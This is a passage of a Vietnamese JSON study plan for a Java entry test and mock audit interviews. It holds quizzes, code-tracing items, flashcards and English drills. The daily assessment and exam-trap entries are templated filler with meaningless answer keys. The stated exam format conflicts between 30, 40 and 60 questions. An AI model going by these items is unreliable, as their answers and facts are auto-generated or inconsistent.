            "ArrayIndexOutOfBoundsException",
            "StackOverflowError"
          ],
          "correct": 0,
          "exp": "Người học thường gặp lỗi biên dịch do không nắm chắc quy tắc định danh hoặc kiểu dữ liệu."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Nguyên nhân phổ biến nhất khiến học viên làm sai câu hỏi Exception trong đề thi?",
          "a": "Không nắm vững quy tắc `finally` vẫn luôn chạy khi có `return` trong `try`, và giá trị return trong `finally` sẽ ghi đè giá trị return trước đó. Một nguyên nhân khác là bỏ sót ngoại lệ runtime trong biểu thức ép kiểu.",
          "trap": "Vẽ call-stack ngắn ra nháp khi làm bài tracing exception phức tạp."
        }
      ],
      "dailyEnglish": [
        {
          "id": 60,
          "vi": "commnet cho hàm override ở actionclass",
          "en": "comment for override function at actionclass"
        },
        {
          "id": 61,
          "vi": "comment cho các hàm getter setter ở bean",
          "en": "comment for getter setter function at bean"
        },
        {
          "id": 62,
          "vi": "đếm số record ở database",
          "en": "Count number of record in database"
        },
        {
          "id": 63,
          "vi": "Tạo list A lấy từ database lên",
          "en": "Create list A from database"
        },
        {
          "id": 64,
          "vi": "Lấy danh sách từ DB và đẩy vào danh sách",
          "en": "Get data from database and show on list"
        }
      ]
    },
    "48": {
      "day": 48,
      "week": 7,
      "title": "Full Mock Entry Test #2 (Nghiêm ngặt)",
      "topics": [
        "Đề thi tổng hợp đầy đủ như thi thật"
      ],
      "tasks": [
        "Bấm giờ đúng 45 phút cho 30 câu (Java + SQL + Web)",
        "Không tra cứu, không AI",
        "Tính điểm và phân tích lỗ hổng"
      ],
      "englishDrill": [
        {
          "id": 63,
          "vi": "Tạo list A lấy từ database lên",
          "en": "Create list A from database"
        },
        {
          "id": 64,
          "vi": "Lấy danh sách từ DB và đẩy vào danh sách",
          "en": "Get data from database and show on list"
        },
        {
          "id": 65,
          "vi": "Kiểm tra dữ liệu đã tồn tại hay chưa ? Nếu có cho ra thông báo lỗi.",
          "en": "Check if [var] exists or not? If existed, show error notice"
        },
        {
          "id": 66,
          "vi": "Tạo biến A lấy dữ liệu từ B",
          "en": "Create variable with data from B"
        },
        {
          "id": 67,
          "vi": "Xử lý điều hướng cho action A",
          "en": "Process navigation for action A"
        }
      ],
      "summary": "FULL MOCK ENTRY TEST #2: Thi thử nghiêm ngặt chuẩn điểm số như thi thật.",
      "coreTheory": "\n### Quy tắc thi thử #2:\n- Bấm giờ đúng 45 phút cho 30 câu (Java + SQL + Web).\n- Đặt điện thoại ở chế độ im lặng, không tra cứu tài liệu, không dùng AI.\n- Đánh giá năng lực thật sự:\n  - $\\ge 24 / 30$: Phong độ cực tốt.\n  - $20 - 23 / 30$: Ổn định.\n  - $< 20 / 30$: Tiếp tục củng cố các mảng bị hổng.\n",
      "codeSnippet": "// Thi thử trên Web App Tab Quiz",
      "traps": [
        "Bình tĩnh đọc kỹ các câu có Exception và Flow control."
      ],
      "quickQuiz": [
        {
          "q": "Sự khác biệt căn bản giữa `Session` và `Cookie` trong lập trình Web Java là gì?",
          "a": "`Cookie` lưu dữ liệu phía Client (trình duyệt), dễ bị chỉnh sửa; `Session` lưu dữ liệu an toàn phía Server, Client chỉ giữ `JSESSIONID` định danh thông qua Cookie hoặc URL rewriting."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟡 MEDIUM (FEE & Audit Practice)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Đề thi tổng hợp đầy đủ như thi thật.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### Quy tắc thi thử #2:\n- Bấm giờ đúng 45 phút cho 30 câu (Java + SQL + Web).\n- Đặt điện thoại ở chế độ im lặng, không tra cứu tài liệu, không dùng AI.\n- Đánh giá năng lực thật sự:\n  - $\\ge 24 / 30$: Phong độ cực tốt.\n  - $20 - 23 / 30$: Ổn định.\n  - $< 20 / 30$: Tiếp tục củng cố các mảng bị hổng.\n",
          "code": "// Thi thử trên Web App Tab Quiz"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_48_1",
          "level": "Easy",
          "question": "Điểm số đạt được hôm nay:",
          "code": "// Thi thử trên Web App Tab Quiz",
          "options": [
            "Đúng theo dự đoán",
            "Compile Error",
            "Runtime Exception",
            "Khác"
          ],
          "correctIndex": 0,
          "explanation": "Ghi nhận kết quả vào lịch sử thi."
        }
      ],
      "examTraps": [
        {
          "trap": "Cạm bẫy 1: Bình tĩnh đọc kỹ các câu có Exception và Flow control.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "// Thi thử trên Web App Tab Quiz",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Chiến thuật thi 60 câu trắc nghiệm",
          "questions": [
            {
              "q": "Tốc độ làm bài chuẩn cho 60 câu hỏi Entry Test trong 45 phút là bao nhiêu giây mỗi câu?",
              "ans": "Trung bình `45 giây` mỗi câu. Dành 30 giây cho câu lý thuyết nhớ và 60-75 giây cho câu trace code."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Quản lý tâm lý thi cử và đánh dấu câu cờ (Flag)",
          "questions": [
            {
              "q": "Nguyên tắc xử lý khi gặp một câu hỏi trace code quá dài và phức tạp là gì?",
              "ans": "Đánh dấu cờ (Flag/Bookmark) và chọn tạm một phương án khả dĩ nhất, sau đó chuyển ngay sang câu tiếp theo. Quay lại giải quyết ở cuối giờ khi đã chắc chắn điểm ở các câu dễ."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace câu hỏi trắc nghiệm kinh điển TestKing",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nint mask = 0;\nint count = 0;\nif ((5 > 7) || (++count > 0)) mask = mask | 1;\nif ((5 > 7) && (++count > 0)) mask = mask | 2;\nSystem.out.println(mask + \" \" + count);\n```\nKết quả in ra là gì?",
              "ans": "In ra: `1 1`. Câu if thứ nhất: `5 > 7` là false, toán tử `||` tiếp tục thực thi `++count > 0` (count tăng lên 1, biểu thức true) -> `mask = 0 | 1 = 1`. Câu if thứ hai: `5 > 7` là false, toán tử `&&` ngắn mạch dừng ngay lập tức (không chạy `++count`) -> count vẫn là 1. Kết quả in ra `1 1`."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy dấu ngoặc nhọn trong câu lệnh if-else",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nif (false)\n    if (true)\n        System.out.print(\"A\");\nelse\n    System.out.print(\"B\");\n```\nKết quả in ra là gì?",
              "ans": "Không in ra gì cả! Theo quy tắc Dangling Else, từ khóa `else` luôn gắn liền với câu lệnh `if` gần nhất phía trước nó (`if (true)`). Do `if (false)` ở ngoài cùng là false, toàn bộ khối bên trong bị bỏ qua."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Đạt mốc 90%+ Entry Test",
          "questions": [
            {
              "q": "Điểm cốt lõi giúp các ứng viên xuất sắc đạt trên 90% điểm Entry Test là gì?",
              "ans": "Sự cẩn trọng tuyệt đối với các chi tiết cú pháp nhỏ: Chữ hoa chữ thường, dấu chấm phẩy sau vòng lặp (`while(true);`), tên file trùng tên class, và các từ khóa đối lập."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_48_1",
          "q": "Về mặt kỹ thuật, khẳng định nào sau đây là CHÍNH XÁC NHẤT về chuyên đề Đề thi tổng hợp đầy đủ như thi thật?",
          "options": [
            "Đặc tả Java quy định cú pháp và cơ chế của Đề thi tổng hợp đầy đủ như thi thật phải được kiểm tra chặt chẽ tại compile-time hoặc runtime",
            "Chỉ hoạt động được trên hệ điều hành Windows",
            "Không bao giờ xảy ra ngoại lệ khi thực thi",
            "Bị cấm sử dụng trong các dự án thực tế"
          ],
          "correct": 0,
          "exp": "Khẳng định 1 tuân thủ đúng chuẩn kiến trúc và đặc tả ngôn ngữ Java cho phần Đề thi tổng hợp đầy đủ như thi thật."
        },
        {
          "id": "da_48_2",
          "q": "Khi thao tác với Đề thi tổng hợp đầy đủ như thi thật, lỗi nào phổ biến nhất?",
          "options": [
            "Lỗi cú pháp (Compile Error)",
            "NullPointerException",
            "ArrayIndexOutOfBoundsException",
            "StackOverflowError"
          ],
          "correct": 0,
          "exp": "Người học thường gặp lỗi biên dịch do không nắm chắc quy tắc định danh hoặc kiểu dữ liệu."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Quy tắc phân bổ thời gian khi làm bài thi Full Mock Entry Test (40 câu / 45 phút)?",
          "a": "1. Vòng 1 (25 phút): Làm hết các câu nhận biết cú pháp và câu ngắn, câu nào dài hoặc tracing phức tạp tạm thời đánh dấu lại.\n2. Vòng 2 (15 phút): Quay lại giải quyết các câu tracing phức tạp.\n3. Vòng 3 (5 phút): Kiểm tra lại toàn bộ và không để trống bất kỳ câu nào.",
          "trap": "Không bao giờ được dừng lại quá 2 phút ở bất kỳ câu hỏi nào."
        }
      ],
      "dailyEnglish": [
        {
          "id": 63,
          "vi": "Tạo list A lấy từ database lên",
          "en": "Create list A from database"
        },
        {
          "id": 64,
          "vi": "Lấy danh sách từ DB và đẩy vào danh sách",
          "en": "Get data from database and show on list"
        },
        {
          "id": 65,
          "vi": "Kiểm tra dữ liệu đã tồn tại hay chưa ? Nếu có cho ra thông báo lỗi.",
          "en": "Check if [var] exists or not? If existed, show error notice"
        },
        {
          "id": 66,
          "vi": "Tạo biến A lấy dữ liệu từ B",
          "en": "Create variable with data from B"
        },
        {
          "id": 67,
          "vi": "Xử lý điều hướng cho action A",
          "en": "Process navigation for action A"
        }
      ]
    },
    "49": {
      "day": 49,
      "week": 7,
      "title": "Audit 1-1 Simulation Session #2",
      "topics": [
        "Phỏng vấn thử lần 2 với các câu hỏi khó"
      ],
      "tasks": [
        "Ghi âm câu trả lời cho các chủ đề: HashMap hashing, Servlet lifecycle, Spring IoC, SQL JOINs vs Subquery",
        "Nghe lại và sửa lỗi nói lan man"
      ],
      "englishDrill": [
        {
          "id": 66,
          "vi": "Tạo biến A lấy dữ liệu từ B",
          "en": "Create variable with data from B"
        },
        {
          "id": 67,
          "vi": "Xử lý điều hướng cho action A",
          "en": "Process navigation for action A"
        },
        {
          "id": 68,
          "vi": "Kiểm tra kết nối dữ liệu",
          "en": "Function of checking data connection"
        },
        {
          "id": 69,
          "vi": "Hiển thị lớp theo mã trường",
          "en": "Function of showing classes by school code"
        },
        {
          "id": 70,
          "vi": "Hàm kiểm tra tồn tại của trường bắt buộc nhập",
          "en": "Function of checking existion of required inputting field"
        }
      ],
      "summary": "AUDIT 1-1 SIMULATION SESSION #2: Vấn đáp các chủ đề nâng cao và hóc búa.",
      "coreTheory": "\n### Các câu hỏi Audit hóc búa nhất:\n1. Cơ chế băm (Hashing) và xử lý va chạm (Collision resolution) trong HashMap?\n2. Tại sao String lại là Immutable trong Java? Lợi ích bảo mật và performance?\n3. Tại sao Interface default method có thể gây ra lỗi Diamond Problem?\n4. Khác biệt giữa Spring Singleton Bean và Singleton Pattern của GoF?\n",
      "codeSnippet": "// Luyện nói to và ghi âm trên Tab Audit",
      "traps": [
        "Tránh trả lời kiểu học vẹt một câu cụt ngủn, luôn phân tích nguyên nhân tại sao."
      ],
      "quickQuiz": [
        {
          "q": "Trong Java memory model, Garbage Collector thu hồi vùng nhớ nào: Stack hay Heap?",
          "a": "Chỉ thu hồi trên Heap! Vùng nhớ Stack tự động giải phóng khi frame của phương thức kết thúc (pop khỏi call stack)."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟡 MEDIUM (FEE & Audit Practice)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Phỏng vấn thử lần 2 với các câu hỏi khó.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### Các câu hỏi Audit hóc búa nhất:\n1. Cơ chế băm (Hashing) và xử lý va chạm (Collision resolution) trong HashMap?\n2. Tại sao String lại là Immutable trong Java? Lợi ích bảo mật và performance?\n3. Tại sao Interface default method có thể gây ra lỗi Diamond Problem?\n4. Khác biệt giữa Spring Singleton Bean và Singleton Pattern của GoF?\n",
          "code": "// Luyện nói to và ghi âm trên Tab Audit"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d49_1",
          "level": "Medium",
          "question": "Trong phỏng vấn kỹ thuật FPT, cấu trúc trả lời một câu hỏi lý thuyết Java chuẩn (STAR / Technical Depth) gồm mấy phần?",
          "code": "// Quy chuẩn trả lời câu hỏi Audit 1-1:\n// 1. Khái niệm cốt lõi (1 câu súc tích)\n// 2. Cơ chế hoạt động trong JVM (Memory/Stack/Heap)\n// 3. Ví dụ thực tế & cạm bẫy hay gặp\n// 4. Lời khuyên Best Practice",
          "options": [
            "Nêu trực diện bản chất -> Cơ chế JVM -> Cạm bẫy -> Best Practice",
            "Chỉ cần đọc thuộc lòng định nghĩa trên slide",
            "Chỉ cần viết code không cần giải thích",
            "Nói càng dài càng tốt không cần trọng tâm"
          ],
          "correctIndex": 0,
          "explanation": "Senior Reviewer tại FPT luôn đánh giá cao ứng viên trả lời gãy gọn theo 4 tầng: Định nghĩa bản chất -> Cơ chế bộ nhớ JVM phía sau -> Cạm bẫy/Lỗi phổ biến -> Cách áp dụng Best Practice trong dự án thực tế."
        }
      ],
      "examTraps": [
        {
          "trap": "Cạm bẫy 1: Tránh trả lời kiểu học vẹt một câu cụt ngủn, luôn phân tích nguyên nhân tại sao.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "// Luyện nói to và ghi âm trên Tab Audit",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Vấn đáp Audit 1-1: Kiến trúc JVM",
          "questions": [
            {
              "q": "Trình bày các phân vùng bộ nhớ chính trong JVM Runtime Data Area.",
              "ans": "1) `Method Area / Metaspace` (lưu bytecode, metadata class, static variables). 2) `Heap` (lưu mọi Objects). 3) `Java Threads Stack` (lưu Stack Frames, local variables). 4) `PC Register` (lưu địa chỉ lệnh byte-code đang thực thi). 5) `Native Method Stack`."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Nguyên lý hoạt động của Garbage Collector",
          "questions": [
            {
              "q": "Trình bày thuật toán Tracing GC (Mark and Sweep) trong Java.",
              "ans": "Bắt đầu từ tập hợp các `GC Roots` (các tham chiếu trên Stack, biến static, JNI pointers), GC duyệt theo đồ thị tham chiếu và đánh dấu (Mark) các đối tượng còn sống. Ở pha Sweep, GC thu hồi vùng nhớ của tất cả các đối tượng không được đánh dấu."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace điều kiện đối tượng đủ điều kiện GC",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\npublic class Test {\n    Test ref;\n    public static void main(String[] args) {\n        Test t1 = new Test();\n        Test t2 = new Test();\n        t1.ref = t2;\n        t2.ref = t1;\n        t1 = null;\n        t2 = null;\n        // Điểm X\n    }\n}\n```\nTại điểm X, hai đối tượng có bị thu gom rác (GC) không? Giải thích hiện tượng Island of Isolation.",
              "ans": "CÓ! Hai đối tượng đều đủ điều kiện thu gom rác. Mặc dù `t1` và `t2` tham chiếu chéo lẫn nhau (Circular Reference), nhưng không còn bất kỳ đường dẫn tham chiếu nào nối từ `GC Roots` đến chúng (Island of Isolation), nên GC vẫn thu hồi bình thường."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy gọi System.gc()",
          "questions": [
            {
              "q": "Gọi lệnh `System.gc()` có đảm bảo rác sẽ được dọn dẹp ngay lập tức không?",
              "ans": "Không đảm bảo! `System.gc()` chỉ gửi lời đề nghị (suggestion) tới JVM, việc khi nào thực thi và thu hồi bao nhiêu hoàn toàn do bộ thu gom rác của JVM quyết định."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Các thế hệ bộ nhớ Heap: Young vs Old Gen",
          "questions": [
            {
              "q": "Tại sao Heap lại chia thành Eden, Survivor (S0/S1), và Tenured (Old Gen)?",
              "ans": "Dựa trên giả thuyết Generational Hypothesis: Phần lớn các đối tượng chết rất nhanh ngay sau khi tạo ra. Việc phân chia giúp thực hiện Minor GC cực nhanh trên Young Generation mà không cần quét toàn bộ Old Gen."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_49_1",
          "q": "Về mặt kỹ thuật, khẳng định nào sau đây là CHÍNH XÁC NHẤT về chuyên đề Phỏng vấn thử lần 2 với các câu hỏi khó?",
          "options": [
            "Đặc tả Java quy định cú pháp và cơ chế của Phỏng vấn thử lần 2 với các câu hỏi khó phải được kiểm tra chặt chẽ tại compile-time hoặc runtime",
            "Chỉ hoạt động được trên hệ điều hành Windows",
            "Không bao giờ xảy ra ngoại lệ khi thực thi",
            "Bị cấm sử dụng trong các dự án thực tế"
          ],
          "correct": 0,
          "exp": "Khẳng định 1 tuân thủ đúng chuẩn kiến trúc và đặc tả ngôn ngữ Java cho phần Phỏng vấn thử lần 2 với các câu hỏi khó."
        },
        {
          "id": "da_49_2",
          "q": "Khi thao tác với Phỏng vấn thử lần 2 với các câu hỏi khó, lỗi nào phổ biến nhất?",
          "options": [
            "Lỗi cú pháp (Compile Error)",
            "NullPointerException",
            "ArrayIndexOutOfBoundsException",
            "StackOverflowError"
          ],
          "correct": 0,
          "exp": "Người học thường gặp lỗi biên dịch do không nắm chắc quy tắc định danh hoặc kiểu dữ liệu."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Cách trả lời câu hỏi phỏng vấn Audit: 'Phân biệt Interface và Abstract Class trong Java 8+'?",
          "a": "- Abstract Class đại diện cho quan hệ bản chất 'IS-A' (là một), có constructor, có thể lưu trữ trạng thái instance fields, đơn kế thừa.\n- Interface đại diện cho quan hệ khả năng 'CAN-DO' (có thể làm), không có constructor, biến chỉ là public static final, hỗ trợ đa kế thừa.",
          "trap": "Từ Java 8 interface có default/static method nhưng vẫn không thể thay thế hoàn toàn abstract class."
        }
      ],
      "dailyEnglish": [
        {
          "id": 66,
          "vi": "Tạo biến A lấy dữ liệu từ B",
          "en": "Create variable with data from B"
        },
        {
          "id": 67,
          "vi": "Xử lý điều hướng cho action A",
          "en": "Process navigation for action A"
        },
        {
          "id": 68,
          "vi": "Kiểm tra kết nối dữ liệu",
          "en": "Function of checking data connection"
        },
        {
          "id": 69,
          "vi": "Hiển thị lớp theo mã trường",
          "en": "Function of showing classes by school code"
        },
        {
          "id": 70,
          "vi": "Hàm kiểm tra tồn tại của trường bắt buộc nhập",
          "en": "Function of checking existion of required inputting field"
        }
      ]
    },
    "50": {
      "day": 50,
      "week": 8,
      "title": "Rà soát Java Core Ch1, Ch2, Ch3",
      "topics": [
        "Primitives, Modifiers, Operators traps"
      ],
      "tasks": [
        "Đọc lại toàn bộ thẻ Flashcards Ch1-3",
        "Làm nhanh 20 câu trắc nghiệm phản xạ"
      ],
      "englishDrill": [
        {
          "id": 69,
          "vi": "Hiển thị lớp theo mã trường",
          "en": "Function of showing classes by school code"
        },
        {
          "id": 70,
          "vi": "Hàm kiểm tra tồn tại của trường bắt buộc nhập",
          "en": "Function of checking existion of required inputting field"
        },
        {
          "id": 71,
          "vi": "Hàm kiểm tra tồn tại của trường bắt buộc nhập",
          "en": "Check data by row on form"
        },
        {
          "id": 72,
          "vi": "Hiển thị lỗi nếu ngày bắt đầu lớn hơn ngày kết thúc",
          "en": "Show error message if Start date is greater than End date"
        },
        {
          "id": 73,
          "vi": "Lấy dữ liệu trường id từ form",
          "en": "Get data of ID field from form"
        }
      ],
      "summary": "Tuần 8 Final Review: Rà soát Java Core Ch1, Ch2, Ch3 (Cú pháp, Access modifiers, Operators).",
      "coreTheory": "Ôn nhanh lại ma trận Access Modifiers, bẫy primitive casting và short-circuit operators. Làm nhanh 20 câu trắc nghiệm phản xạ.",
      "codeSnippet": "// Rà soát Ch1-Ch3",
      "traps": [
        "Local variable default value trap, byte overflow trap."
      ],
      "quickQuiz": [
        {
          "q": "Trong Java 8, `Optional.ofNullable(null).orElse(\"Default\")` và `Optional.ofNullable(null).orElseGet(() -> \"Default\")` khác nhau ở điểm nào?",
          "a": "`orElse()` luôn thực thi biểu thức tham số truyền vào bất kể Optional có rỗng hay không; `orElseGet()` dùng Supplier lazy evaluation, chỉ thực thi khi Optional thực sự rỗng (tối ưu hiệu năng)."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟡 MEDIUM (FEE & Audit Practice)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Primitives, Modifiers, Operators traps.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "Ôn nhanh lại ma trận Access Modifiers, bẫy primitive casting và short-circuit operators. Làm nhanh 20 câu trắc nghiệm phản xạ.",
          "code": "// Rà soát Ch1-Ch3"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d50_1",
          "level": "Hard",
          "question": "Đoạn code rà soát kiến thức Ch1-3 sau in ra kết quả gì?",
          "code": "public class Ch13Review {\n    public static void main(String[] args) {\n        byte a = 127;\n        a++;\n        System.out.println(a);\n    }\n}",
          "options": [
            "-128",
            "128",
            "Compile Error",
            "OverflowException"
          ],
          "correctIndex": 0,
          "explanation": "Kiểu `byte` có kích thước 8-bit có dấu, giá trị tối đa là `127` (nhị phân `01111111`). Khi thực hiện `a++`, xảy ra hiện tượng tràn số (integer overflow), bit dấu chuyển thành `1` (`10000000`), chính là giá trị nhỏ nhất `-128`. Java không ném exception khi tràn số nguyên nguyên thủy!"
        }
      ],
      "examTraps": [
        {
          "trap": "Cạm bẫy 1: Local variable default value trap, byte overflow trap.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "// Rà soát Ch1-Ch3",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Vấn đáp Audit 1-1: Collections Internals",
          "questions": [
            {
              "q": "Load Factor mặc định của `HashMap` là bao nhiêu và nó có ý nghĩa gì?",
              "ans": "Load Factor mặc định là `0.75`. Khi số lượng phần tử vượt quá `capacity * 0.75` (Threshold), mảng bucket sẽ tự động tăng kích thước gấp đôi (Rehashing)."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Cơ chế tính chỉ số Bucket trong HashMap",
          "questions": [
            {
              "q": "HashMap dùng công thức nào để ánh xạ `hashCode()` vào vị trí index trong mảng bucket?",
              "ans": "Công thức: `index = (n - 1) & hash`, trong đó `n` là độ dài mảng bucket (luôn là lũy thừa của 2). Phép toán bitwise AND này tương đương với phép chia lấy dư `% n` nhưng có tốc độ thực thi cực nhanh trên CPU."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace va chạm băm (Hash Collision)",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nclass BadKey {\n    public int hashCode() { return 1; }\n    public boolean equals(Object o) { return this == o; }\n}\nMap<BadKey, String> map = new HashMap<>();\nmap.put(new BadKey(), \"A\");\nmap.put(new BadKey(), \"B\");\nSystem.out.println(map.size());\n```\nHashMap hoạt động như thế nào và kích thước in ra là bao nhiêu?",
              "ans": "In ra: 2. Hai đối tượng đều rơi vào cùng một bucket index (vì hashCode đều là 1). Nhưng khi kiểm tra `equals()`, chúng là 2 đối tượng khác nhau (`this == o` trả về false), nên HashMap lưu chúng thành một danh sách liên kết trong cùng bucket đó."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy thay đổi Key khi đang nằm trong HashSet",
          "questions": [
            {
              "q": "Nếu một đối tượng thêm vào `HashSet`, sau đó bị thay đổi thuộc tính ảnh hưởng đến `hashCode()`, phương thức `set.contains(obj)` sẽ trả về gì?",
              "ans": "Trả về `false`! Đối tượng vẫn tồn tại trong Set nhưng không thể tìm thấy, gây ra rò rỉ bộ nhớ nghiêm trọng."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "LinkedHashMap LRU Cache",
          "questions": [
            {
              "q": "Làm thế nào để biến `LinkedHashMap` thành một bộ nhớ đệm LRU (Least Recently Used) Cache tự động đẩy phần tử cũ nhất ra ngoài?",
              "ans": "Khởi tạo với `accessOrder = true` và override phương thức `removeEldestEntry(Map.Entry eldest) { return size() > MAX_ENTRIES; }`."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_50_1",
          "q": "Về mặt kỹ thuật, khẳng định nào sau đây là CHÍNH XÁC NHẤT về chuyên đề Primitives, Modifiers, Operators traps?",
          "options": [
            "Đặc tả Java quy định cú pháp và cơ chế của Primitives, Modifiers, Operators traps phải được kiểm tra chặt chẽ tại compile-time hoặc runtime",
            "Chỉ hoạt động được trên hệ điều hành Windows",
            "Không bao giờ xảy ra ngoại lệ khi thực thi",
            "Bị cấm sử dụng trong các dự án thực tế"
          ],
          "correct": 0,
          "exp": "Khẳng định 1 tuân thủ đúng chuẩn kiến trúc và đặc tả ngôn ngữ Java cho phần Primitives, Modifiers, Operators traps."
        },
        {
          "id": "da_50_2",
          "q": "Khi thao tác với Primitives, Modifiers, Operators traps, lỗi nào phổ biến nhất?",
          "options": [
            "Lỗi cú pháp (Compile Error)",
            "NullPointerException",
            "ArrayIndexOutOfBoundsException",
            "StackOverflowError"
          ],
          "correct": 0,
          "exp": "Người học thường gặp lỗi biên dịch do không nắm chắc quy tắc định danh hoặc kiểu dữ liệu."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Tổng kết 3 bẫy cú pháp kinh điển nhất trong Java Core Chương 1 - 3?",
          "a": "1. Bát phân chứa chữ số 8 hoặc 9 (`int x = 08;`).\n2. Phép toán số học trên byte tự động nâng lên int (`b1 + b2` trả về int).\n3. Ép kiểu tham chiếu không hợp lệ ném ClassCastException.",
          "trap": "Xem kỹ từng ký tự literal trong mã nguồn đề thi."
        }
      ],
      "dailyEnglish": [
        {
          "id": 69,
          "vi": "Hiển thị lớp theo mã trường",
          "en": "Function of showing classes by school code"
        },
        {
          "id": 70,
          "vi": "Hàm kiểm tra tồn tại của trường bắt buộc nhập",
          "en": "Function of checking existion of required inputting field"
        },
        {
          "id": 71,
          "vi": "Hàm kiểm tra tồn tại của trường bắt buộc nhập",
          "en": "Check data by row on form"
        },
        {
          "id": 72,
          "vi": "Hiển thị lỗi nếu ngày bắt đầu lớn hơn ngày kết thúc",
          "en": "Show error message if Start date is greater than End date"
        },
        {
          "id": 73,
          "vi": "Lấy dữ liệu trường id từ form",
          "en": "Get data of ID field from form"
        }
      ]
    },
    "51": {
      "day": 51,
      "week": 8,
      "title": "Rà soát Java Core Ch4, Ch5",
      "topics": [
        "Flow control, Exceptions bẫy return finally, OOP rules"
      ],
      "tasks": [
        "Đọc lại flashcards Ch4-5",
        "Làm nhanh 20 câu trắc nghiệm"
      ],
      "englishDrill": [
        {
          "id": 72,
